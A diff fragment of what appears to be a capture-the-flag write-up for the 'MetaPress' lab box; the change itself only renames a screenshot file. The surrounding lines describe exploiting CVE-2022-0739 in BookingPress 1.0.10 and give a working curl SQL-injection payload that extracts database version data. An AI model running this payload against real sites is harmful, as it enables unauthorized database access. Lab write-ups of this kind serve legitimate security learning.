@@ -22,7 +22,7 @@
 ## Exploitation  
 - We researched BookingPress 1.0.10 and found **CVE-2022-0739**, an Unauthenticated SQL Injection vulnerability.  
 - Following the PoC, we first identified the `_wpnonce` value.  
-![Nounce](Nounce.png)  
+![Nonce](Nonce.png)  
 - We then executed a crafted request to extract database version information and confirmed SQL Injection worked.
 ```bash
 curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=<_wpnonce_value>&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
